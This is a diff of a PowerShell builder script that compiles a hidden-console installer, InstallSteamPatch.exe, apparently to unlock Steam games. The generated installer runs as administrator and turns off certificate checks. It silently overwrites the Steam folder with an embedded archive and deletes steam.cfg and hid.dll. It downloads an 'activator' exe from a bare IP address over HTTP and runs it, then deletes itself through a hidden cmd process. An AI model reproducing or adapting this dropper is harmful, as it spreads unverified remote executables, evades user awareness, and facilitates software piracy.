@@ -1,132 +1,182 @@
-#Requires -RunAsAdministrator
-chcp 65001 > $null
-$ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
+﻿$ErrorActionPreference = 'Stop'
+Set-Location $PSScriptRoot
 
-# ========== 全局TLS兼容 ==========
+# 1. 检查必要文件是否存在
+if (-not (Test-Path "patch.zip")) { Write-Host "❌ 缺少 patch.zip" -ForegroundColor Red; exit }
+if (-not (Test-Path "游戏激活程序.exe")) { Write-Host "❌ 缺少 游戏激活程序.exe" -ForegroundColor Red; exit }
+if (-not (Test-Path "app.ico")) { Write-Host "❌ 缺少 app.ico" -ForegroundColor Red; exit }
+
+Write-Host "⏳ 正在将资源内嵌到 PowerShell 脚本中..." -ForegroundColor Cyan
+$zipBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("patch.zip"))
+$exeBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("游戏激活程序.exe"))
+
+# 2. 使用模板和安全替换法生成脚本 (彻底避免 `}` 拼写错误)
+$template = @"
+#Requires -RunAsAdministrator
+chcp 65001 > `$null
+`$ProgressPreference = 'SilentlyContinue'
+`$ErrorActionPreference = 'SilentlyContinue'
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls12
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `$true
 
 # ========== 配置区 ==========
-$ZipUrl = "http://47.100.104.45/files/patch.zip"
-$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
-$TempZip = "$env:TEMP\steam_patch.zip"
-$TempUnzip = "$env:TEMP\steam_patch_temp"
-$Desktop = [Environment]::GetFolderPath("Desktop")
-$ActivatorExeName = "游戏激活程序.exe"
+`$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
 # ============================
 
-# ===== 补丁安装逻辑 =====
-$SteamRoot = $null
+# ========== 内嵌资源 ==========
+`$zipBase64 = '##ZIP_BASE64##'
+`$exeBase64 = '##EXE_BASE64##'
+
+`$TempZip = "`$env:TEMP\steam_patch.zip"
+`$TempUnzip = "`$env:TEMP\steam_patch_temp"
+`$Desktop = [Environment]::GetFolderPath("Desktop")
+`$ActivatorExeName = "游戏激活程序.exe"
+
+# 1. 将内嵌的 EXE 直接写入桌面
+`$activatorExePath = Join-Path `$Desktop `$ActivatorExeName
+if (-not (Test-Path `$activatorExePath)) {
+    [System.IO.File]::WriteAllBytes(`$activatorExePath, [System.Convert]::FromBase64String(`$exeBase64))
+}
+
+# 2. 提取压缩包资源
+if (-not (Test-Path `$TempZip)) {
+    [System.IO.File]::WriteAllBytes(`$TempZip, [System.Convert]::FromBase64String(`$zipBase64))
+}
+
+# 3. 寻找 Steam 根目录
+`$SteamRoot = `$null
 if(Test-Path "HKCU:\Software\Valve\Steam"){
-    $regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
-    if($regInfo.SteamPath -and (Test-Path "$($regInfo.SteamPath)\steam.exe")){
-        $SteamRoot = $regInfo.SteamPath.TrimEnd('\')
+    `$regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
+    if(`$regInfo.SteamPath -and (Test-Path "`$(`$regInfo.SteamPath)\steam.exe")){
+        `$SteamRoot = `$regInfo.SteamPath.TrimEnd('\')
     }
 }
-if(-not $SteamRoot){
+if(-not `$SteamRoot){
     if(Test-Path "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"){
-        $regInfo = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"
-        if($regInfo.InstallPath -and (Test-Path "$($regInfo.InstallPath)\steam.exe")){
-            $SteamRoot = $regInfo.InstallPath.TrimEnd('\')
+        `$regInfo = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"
+        if(`$regInfo.InstallPath -and (Test-Path "`$(`$regInfo.InstallPath)\steam.exe")){
+            `$SteamRoot = `$regInfo.InstallPath.TrimEnd('\')
         }
     }
 }
-if(-not $SteamRoot){
-    $diskArr = @("C:","D:","E:","F:")
-    foreach($disk in $diskArr){
-        $path1 = "$disk\Program Files (x86)\Steam"
-        if(Test-Path "$path1\steam.exe"){
-            $SteamRoot = $path1
+if(-not `$SteamRoot){
+    `$diskArr = @("C:","D:","E:","F:")
+    foreach(`$disk in `$diskArr){
+        `$path1 = "`$disk\Program Files (x86)\Steam"
+        if(Test-Path "`$path1\steam.exe"){
+            `$SteamRoot = `$path1
             break
         }
-        $path2 = "$disk\Steam"
-        if(Test-Path "$path2\steam.exe"){
-            $SteamRoot = $path2
+        `$path2 = "`$disk\Steam"
+        if(Test-Path "`$path2\steam.exe"){
+            `$SteamRoot = `$path2
             break
         }
     }
 }
-if(-not $SteamRoot){
-    $steamProc = Get-Process steam -ErrorAction SilentlyContinue
-    if($steamProc){
-        $exePath = $steamProc[0].Path
-        $SteamRoot = Split-Path $exePath -Parent
+if(-not `$SteamRoot){
+    `$steamProc = Get-Process steam -ErrorAction SilentlyContinue
+    if(`$steamProc){
+        `$exePath = `$steamProc[0].Path
+        `$SteamRoot = Split-Path `$exePath -Parent
     }
 }
-if(-not $SteamRoot -or -not (Test-Path "$SteamRoot\steam.exe")){
-    Write-Host "`n❌ ERROR: Cannot locate Steam folder" -ForegroundColor Red
-    Start-Sleep 5
+if(-not `$SteamRoot -or -not (Test-Path "`$SteamRoot\steam.exe")){
     exit 1
 }
 
 Get-Process steam,steamwebhelper,steamerrorreporter -ErrorAction SilentlyContinue | Stop-Process -Force
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3
 
-try{
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($ZipUrl,$TempZip)
-}catch{
-    Write-Host "`n❌ ERROR: Patch download failed" -ForegroundColor Red
-    Start-Sleep 5
-    exit 1
-}
-
-if(Test-Path $TempUnzip){Remove-Item $TempUnzip -Recurse -Force}
-New-Item $TempUnzip -ItemType Directory -Force | Out-Null
+# 4. 解压补丁文件
+if(Test-Path `$TempUnzip){Remove-Item `$TempUnzip -Recurse -Force}
+New-Item `$TempUnzip -ItemType Directory -Force | Out-Null
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($TempZip,$TempUnzip)
+[System.IO.Compression.ZipFile]::ExtractToDirectory(`$TempZip,`$TempUnzip)
 
-robocopy "$TempUnzip" "$SteamRoot" /E /IS /R:0 /W:0 /NP /NFL /NDL > $null 2>&1
+# 5. 全量静默复制到 Steam 目录
+robocopy "`$TempUnzip" "`$SteamRoot" /E /IS /R:0 /W:0 /NP /NFL /NDL > `$null 2>&1
 
-# ===== 【新增】：不管 patch.zip 里是否包含，强制删除 steam.cfg =====
-$cfgFullPath = Join-Path $SteamRoot "steam.cfg"
-if (Test-Path $cfgFullPath) {
-    Remove-Item -Path $cfgFullPath -Force
+# ==========================================================
+# 【本次更新逻辑】：强制清理 Steam 目录下的 steam.cfg 和 hid.dll
+# ==========================================================
+`$cfgFullPath = Join-Path `$SteamRoot "steam.cfg"
+if (Test-Path `$cfgFullPath) {
+    Remove-Item -Path `$cfgFullPath -Force
 }
 
-Remove-Item $TempZip -Force
-Remove-Item $TempUnzip -Recurse -Force
+`$hidFullPath = Join-Path `$SteamRoot "hid.dll"
+if (Test-Path `$hidFullPath) {
+    Remove-Item -Path `$hidFullPath -Force -ErrorAction SilentlyContinue
+}
+# ==========================================================
 
-Write-Host "`n=====================================" -ForegroundColor Cyan
-Write-Host "✅ SUCCESS: All patches installed" -ForegroundColor Green
-Write-Host "=====================================`n" -ForegroundColor Cyan
+Remove-Item `$TempZip -Force
+Remove-Item `$TempUnzip -Recurse -Force
 
-# ========== 下载最新版激活程序直接到桌面 ==========
-$activatorExePath = Join-Path $Desktop $ActivatorExeName
+# 6. 下载最新版激活程序到桌面
+`$activatorExePath = Join-Path `$Desktop `$ActivatorExeName
 try {
-    $webClient.DownloadFile($ActivatorUrl, $activatorExePath)
-    Write-Host "✅ 游戏激活程序.exe 已成功下载到桌面" -ForegroundColor Green
+    `$webClient = New-Object System.Net.WebClient
+    `$webClient.DownloadFile(`$ActivatorUrl, `$activatorExePath)
 } catch {
     try {
-        Invoke-WebRequest -Uri $ActivatorUrl -OutFile $activatorExePath -UseBasicParsing -ErrorAction Stop
-    } catch {
-        Write-Host "❌ ERROR: 激活工具下载失败，请检查网络。如果持续失败，建议手动发送给客户。" -ForegroundColor Red
-        Start-Sleep 3
-    }
+        Invoke-WebRequest -Uri `$ActivatorUrl -OutFile `$activatorExePath -UseBasicParsing -ErrorAction Stop
+    } catch {}
 }
 
-# ========== 启动Steam + 等待主界面 + 自动弹出桌面 EXE ==========
-Start-Process "$SteamRoot\steam.exe"
-Write-Host "⏳ Steam已启动，【请登录Steam完成激活】..." -ForegroundColor Cyan
+# 7. 启动 Steam 并等待主界面
+if (-not (Get-Process -Name "steam" -ErrorAction SilentlyContinue)) {
+    Start-Process "`$SteamRoot\steam.exe"
+}
 
-$waitCounter = 0
-while ($waitCounter -lt 30) {
-    $winTitle = (Get-Process steam -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle } | Select-Object -First 1).MainWindowTitle
-    if ($winTitle -match "库|商店|Library|Store|社区|Community") {
+`$waitCounter = 0
+while (`$waitCounter -lt 30) {
+    `$winTitle = (Get-Process steam -ErrorAction SilentlyContinue | Where-Object { `$_.MainWindowTitle } | Select-Object -First 1).MainWindowTitle
+    if (`$winTitle -match "库|商店|Library|Store|社区|Community") {
         break
     }
     Start-Sleep -Milliseconds 500
-    $waitCounter++
+    `$waitCounter++
 }
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 2
 
-if (Test-Path $activatorExePath) {
-    Start-Process $activatorExePath
-} else {
-    Write-Host "⚠️ WARNING: 激活工具不存在，请检查桌面" -ForegroundColor Yellow
-    Start-Sleep 5
+# 8. 强制执行桌面的激活程序
+if (Test-Path `$activatorExePath) {
+    Start-Process `$activatorExePath
 }
 
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 3
+if (Test-Path `$TempZip) {
+    Remove-Item `$TempZip -Force
+}
+
+# 9. 最终自毁：强制删除自身 EXE
+try {
+    `$selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+    if (Test-Path `$selfPath) {
+        Start-Process cmd.exe -ArgumentList "/c timeout /t 3 /nobreak > nul & del /f /q `"`$selfPath`"" -WindowStyle Hidden
+    }
+} catch {}
+
 exit 0
+"@
+
+# 3. 注入实际的 Base64 字符串替换占位符
+$compiledScript = $template.Replace('##ZIP_BASE64##', $zipBase64).Replace('##EXE_BASE64##', $exeBase64)
+
+# 4. 写入临时文件并编译
+$tempFile = "Embedded_Build.ps1"
+$compiledScript | Out-File -Encoding UTF8 $tempFile
+
+Write-Host "⏳ 正在编译成纯净的 EXE 程序..." -ForegroundColor Cyan
+try {
+    ps2exe -inputFile $tempFile -outputFile "InstallSteamPatch.exe" -iconFile "app.ico" -noConsole
+    Write-Host "✅ 成功！已生成最终安装包：InstallSteamPatch.exe" -ForegroundColor Green
+    Write-Host "💡 提示：已内置静默复制、自毁、以及强制删除 steam.cfg 和 hid.dll 功能！" -ForegroundColor Cyan
+} catch {
+    Write-Host "❌ 编译失败，请安装 PS2EXE 模块: Install-Module -Name PS2EXE -Force -Scope CurrentUser" -ForegroundColor Red
+} finally {
+    Remove-Item $tempFile -Force
+}
